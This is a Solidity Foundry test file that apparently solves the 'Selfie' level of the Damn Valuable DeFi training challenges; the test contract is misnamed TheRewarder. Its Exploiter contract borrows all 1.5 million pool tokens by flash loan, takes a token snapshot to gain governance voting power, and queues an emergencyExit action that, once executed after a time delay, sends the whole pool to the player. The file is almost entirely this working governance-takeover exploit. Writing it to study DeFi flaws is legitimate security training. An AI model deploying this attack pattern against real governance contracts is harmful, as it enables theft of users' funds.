// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {SelfiePool} from "../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../src/selfie/SimpleGovernance.sol";
import {ISimpleGovernance} from "../src/selfie/ISimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../src/DamnValuableTokenSnapshot.sol";

contract TheRewarder is Test {
    address player = makeAddr("player");

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000 * 1e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000 * 1e18;

    function setUp() public {
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        assertEq(governance.getActionCounter(), 1);
        pool = new SelfiePool(address(token), address(governance));
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function test_take_all_selfie_tokens() public {
        vm.startPrank(player);
        Exploiter exploiter = new Exploiter(address(token), address(pool), address(governance));
        exploiter.execute();
        vm.warp(2 days + 1);
        governance.executeAction(exploiter.s_actionID());
        vm.stopPrank();

        // ending asserts
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Exploiter is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;
    address owner;

    uint256 public s_actionID;

    uint256 constant TOKENS_IN_POOL = 1_500_000 * 1e18;

    constructor(address _token, address _pool, address _governance) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    function execute() external {
        if (msg.sender != owner) revert();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, data);
    }

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param _token The loan currency.
     * @param _amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param _data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "IERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(address initiator, address _token, uint256 _amount, uint256 fee, bytes calldata _data)
        external
        returns (bytes32)
    {
        if (msg.sender != address(pool)) revert();
        token.snapshot();
        s_actionID = governance.queueAction(address(pool), 0, _data);
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
